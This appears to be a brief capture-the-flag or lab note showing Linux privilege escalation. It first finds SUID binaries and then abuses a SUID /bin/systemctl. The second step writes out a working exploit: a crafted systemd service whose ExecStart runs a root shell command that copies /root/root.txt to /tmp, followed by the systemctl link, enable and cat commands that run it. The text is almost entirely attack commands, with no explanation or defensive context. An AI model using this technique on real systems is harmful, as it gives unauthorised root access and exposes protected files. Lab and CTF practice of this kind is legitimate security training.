1) find . -perm /4000
/bin/systemctl
2)
- eop=$(mktemp).service
- echo '[Service]
- ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
- [Install]
- WantedBy=multi-user.target' > $eop
- /bin/systemctl link $eop
- /bin/systemctl enable --now $eop
- cat /tmp/output